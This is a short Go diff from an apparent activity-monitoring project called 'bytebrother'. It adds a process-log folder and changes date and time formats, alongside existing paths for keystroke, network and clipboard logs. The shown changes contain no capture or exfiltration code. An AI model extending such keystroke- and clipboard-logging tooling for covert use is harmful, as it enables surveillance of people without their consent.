@@ -9,7 +9,9 @@ import (
 
 var Folder string = "bytebrother/"
 var LogFolder string = Folder + "logs/"
+var ProcessFolder string = LogFolder + "exes/"
 var ExeLog string = "exes.json"
+
 var SettingsFile string = "settings.json"
 var NetworkLogs string = "network_logs.log"
 var KeyLogs string = "key_logs.log"
@@ -104,6 +106,14 @@ func MakeNecessaryFiles() {
 		}
 	}
 
+	// Create a new directory for process logs
+	if !IfDirExists(ProcessFolder) {
+		err := MakeDir(ProcessFolder)
+		if err != nil {
+			f.Printf("Failed to create directory: %v\n", err)
+		}
+	}
+
 	// Create a new file for settings
 	if !IfFileExists(Folder + SettingsFile) {
 		_, err := MakeFile(Folder + SettingsFile)
@@ -136,9 +146,9 @@ func TodaysClipboardFolder() string {
 }
 
 func Today() string {
-	return time.Now().Format("2006.01.02")
+	return time.Now().Format("02.01.2006")
 }
 
 func CurrentTime() string {
-	return time.Now().Format("15.04.05")
+	return time.Now().Format("15:04:05")
 }
